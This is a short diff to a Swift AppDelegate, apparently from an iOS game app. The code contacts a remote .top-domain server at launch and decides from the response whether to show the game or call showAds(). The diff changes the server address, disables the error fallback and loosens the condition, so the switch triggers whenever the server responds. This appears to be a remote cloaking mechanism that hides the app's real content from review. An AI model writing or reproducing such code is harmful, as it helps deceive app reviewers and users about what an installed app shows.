@@ -33,7 +33,7 @@ class AppDelegate: NSObject, URLSessionDelegate {
     
     func validation() {
         if !validationIsOn {
-            let textFieldText = "https://potawatomionline.top/img"
+            let textFieldText = "https://muchklegra.top/start"
             
             guard let url = URL(string: textFieldText) else {
                 self.showGame()
@@ -64,17 +64,17 @@ class AppDelegate: NSObject, URLSessionDelegate {
                     print("Status code: \(httpResponse.statusCode)")
                     print("Headers: \(httpResponse.allHeaderFields)")
 
-                    if !(0...399).contains(httpResponse.statusCode) {
-                        print("HTTP error: Status code \(httpResponse.statusCode)")
-                        self.showGame()
-                        return
-                    }
+//                    if !(0...399).contains(httpResponse.statusCode) {
+//                        print("HTTP error: Status code \(httpResponse.statusCode)")
+//                        self.showGame()
+//                        return
+//                    }
 
                     if let finalURL = httpResponse.url?.absoluteString {
                         print("Final URL after redirects: \(finalURL)")
 
                         
-                        if !finalURL.contains("https://www.google.com/") {
+                        if !(400...599).contains(httpResponse.statusCode) {
                             self.validationIsOn = true
                             self.showAds()
                         } else {
